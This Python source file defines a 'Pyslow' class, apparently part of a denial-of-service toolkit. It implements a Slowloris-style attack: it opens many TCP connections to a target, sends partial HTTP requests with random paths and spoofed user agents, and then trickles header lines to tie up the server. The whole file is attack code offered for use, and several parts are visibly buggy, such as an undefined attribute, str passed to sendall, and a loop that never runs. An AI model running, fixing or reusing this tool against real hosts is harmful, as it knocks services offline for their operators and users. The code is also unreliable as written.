from socket import *
import sys
import time
from random import choice, randint
from termcolor import colored, cprint

from ..add_useragent import add_useragent
class Pyslow:
	def __init__(self,
		        tgt,
		        port,
		        to,
		        threads,
		        sleep):
		self.tgt = tgt
		self.port = port
		self.to = to
		self.threads = threads
		self.sleep = sleep
		self.method = ['GET','POST']
		self.pkt_count = 0
	def mypkt(self):
		text = choice(self.method) + ' /' + str(randint(1,999999999)) + ' HTTP/1.1\r\n'+\
		      'Host:'+self.tgt+'\r\n'+\
		      'User-Agent:'+choice(add_useragent())+'\r\n'+\
		      'Content-Length: 42\r\n'
		pkt = text.encode()
		return pkt
	def building_socket(self):
		try:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			self.pkt_count += 3
			if sock:
				sock.sendto(self.mypkt(),(self.tgt,int(self.port)))
				self.pkt_count += 1
		except Exception:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			sock.settimeout(None)
			self.pkt_count+=3
			if sock:
				sock.sendto(self.mypkt(),(self.tgt,int(self.port)))
				self.pkt_count+=1
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user','red'))
		return sock
	def sending_packets(self):
		try:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			self.pkt_count+=3
			if sock:
				sock.sendall('X-a: b\r\n')
				self.pkt+=1
		except Exception:
			sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
			sock.settimeout(self.to)
			sock.connect((self.tgt,int(self.port)))
			sock.settimeout(None)
			if sock:
				sock.sendall('X-a: b\r\n')
				self.pkt_count+=1
		except KeyboardInterrupt:
			sys.exit(cprint('[-] Canceled by user','red'))
		return sock
	def doconnection(self):
		socks = 0
		fail=0
		lsocks=[]
		lhandlers=[]
		cprint('\t\tBuilding sockets','blue')
		while socks < (int(self.threads)):
			try:
				sock = self.building_socket()
				if sock:
					lsocks.append(sock)
					socks+=1
					if socks > int(self.threads):
						break
			except Exception:
				fail+=1
			except KeyboardInterrupt:
				sys.exit(cprint('[-] Canceled by user','red'))
		cprint('\t\tSending packets','blue')
		while socks < int(self.threads):
			try:
				handler = self.sending_packets()
				if handler:
					lhandlers.append(handler)
					socks+=1
					if socks > int(self.threads):
						break
				else:
					pass
			except Exception:
				fail+=1
			except KeyboardInterrupt:
				break
				sys.exit(cprint('[-] Canceled by user','red'))
		# print colored('I have sent ','green') + colored(str(self.pkt_count),'cyan') + colored(' packets successfully.Now i\'m going to sleep for ','green') + colored(self.sleep,'red') + colored(' second','green')
		time.sleep(self.sleep)
